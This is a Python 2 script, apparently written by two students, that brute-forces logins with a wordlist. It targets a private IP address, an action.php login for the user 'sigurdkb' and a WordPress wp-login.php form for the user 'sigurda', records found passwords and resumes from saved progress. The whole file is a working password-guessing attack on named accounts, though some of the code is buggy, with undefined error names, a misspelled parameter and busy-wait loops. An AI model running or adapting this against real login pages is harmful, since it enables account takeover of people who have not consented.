"""
Brute-force a log-in, using passwordlists generated by generate.py

Made by Leander Thorkildsen and Theodor Fossum.
"""

import os
import sys
import time
import getopt
import requests
import mechanize
 


def usage():
    print("\nCommand Line Arguments:")
    print("    -i    Input file (wordlist)")
    print("    -r    Restart progress")
    print("    -h    Display this message")
    print("\n")



def add_password(password):
    f = open("passwords.txt", "a")
    f.write("{}\n".format(password))
    f.close()



def make_request(password):
    # This method was first tried cause it was faster
    # But was replaced with Mechanize (see function below)    
    r = ""
    r = requests.post("http://10.225.147.176/~sigurdkb/action.php?ulogin=sigurdkb&upass="+password+"&action=login&submit=Log+In")
    while r.text is "":
        print "."
    print r.text
    if r.text != "Error: Incorrect login or password.":
        print "Correct password:", password
        print "Text:", r.text
        add_password(password)



def mecha(password, browser):
    browser.select_form(nr=0)
    browser['log'] = "sigurda"
    browser['pwd'] = password
    response = browser.submit().read()

    while response is "":
        print "."

    if not "ERROR" in response:
        print "PASSWORD FOUND: ", password
        add_password(password)



def open_list(input_fp):
    try:
        with open(input_fp, "r") as f:
            passwordlist = f.read()
    except OSError as e:
        if e.errno == ENOENT:
            print "Error: File not found"
        if e.errno == EPERM:
            print "Eroor: Permission denied"

    return passwordlist



def get_progress():
    if restart:
        return 1
    with open("progress.txt", "r") as f:
        progresslist = f.read()
    progress = progresslist.split("\n")
    del progress[-1]
    progress_as_int = [int(i) for i in progress]
    last = progress_as_int[-1]
    return last



def set_progress(progress):
    f = open("progress.txt", "a")
    f.write("{}\n".format(progress))
    f.close()



def brute_from_save(inut_fp, added):
    f = open_list(input_fp)
    passwordlist = f.split('\n')
    del passwordlist[-1]

    progress = 0
    progress = get_progress()
    print "Progress:", progress

    printer = 0
    delay = 0
    timer = time.time()

    browser = mechanize.Browser()
    browser.set_handle_robots(False) #ignore robots.txt
    browser.open("http://10.225.147.176/wp-login.php")

    length = len(passwordlist)
    split = length/100
    for i in range(progress, length):
        # Make request
        mecha(passwordlist[i], browser)

        printer = printer + 1
        if printer > split:
            delay = time.time() - timer
            speed = int(split/delay)
            percent = ((progress*100)/length)
            # Print progress to terminal
            print "Trying {:<10} with".format(passwordlist[i]), speed, "passwords per second. ", percent, " %"
            printer = 0
            timer = time.time()
            progress = progress + split - (split/100)
            set_progress(progress) # Save progress



def if_added(added):
    if added:
        print "Password added in passwords.txt"



if __name__ == "__main__":
    try:
        opts, args = getopt.getopt(sys.argv[1:], 'h:i:r')
    except getopt.GetoptError:
        usage()
        sys.exit(1)

    # default
    input_fp = "passwordlist.txt"
    added = False
    save = False
    restart = False

    for opt, arg in opts:
        if opt in ("-h"):
            usage()
            sys.exit(1)
        elif opt in ("-i"):
            input_fp = arg
        elif opt in ("-s"):
            save = True
        elif opt in ("-r"):
            restart = True
        else:
            print("Invalid argument {}".format(opt))

    try:
        brute_from_save(input_fp, added)
        if_added(added)
    except Exception as e:
        print "Oh no, something went wrong."
        print(e)
        usage()
        sys.exit(1)



